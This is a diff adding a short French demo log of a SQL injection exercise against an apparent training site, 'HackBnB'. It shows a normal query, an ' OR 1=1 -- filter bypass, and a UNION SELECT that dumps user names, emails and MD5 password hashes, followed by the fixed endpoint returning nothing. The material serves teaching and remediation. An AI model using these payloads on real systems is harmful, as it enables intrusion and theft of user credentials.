@@ -1,0 +1,19 @@
+====================  D1 — INJECTION SQL  ====================
+
+# 1. Requete legitime (filtre categorie) :
+$ curl -G /rooms/ --data-urlencode "category=hut"
+  -> 2 chambres de categorie hut
+
+# 2. Contournement du filtre  (  ' OR 1=1 --  )  :
+$ curl -G /rooms/ --data-urlencode "category=hut' OR 1=1 -- "
+  ->  10 chambres  =  TOUTE la table, filtre neutralise
+
+# 3. UNION SELECT -> exfiltration de la table users :
+$ curl -G /rooms/ --data-urlencode \
+       "category=x' UNION SELECT id,name,email,password_hash,0,'',0,0 FROM users -- "
+   [FUITE] user #1  John Doe      email=elodie.marchand@hackbnb.fr
+           password_hash (MD5) = 8194044ff0c00fe3e4c74680af51c816
+
+------------------  APRES CORRECTIF (:9002)  ------------------
+$ curl -G /rooms/ --data-urlencode "category=hut' OR 1=1 -- "
+  ->  []   (filter(Room.category==category) : injection impossible)
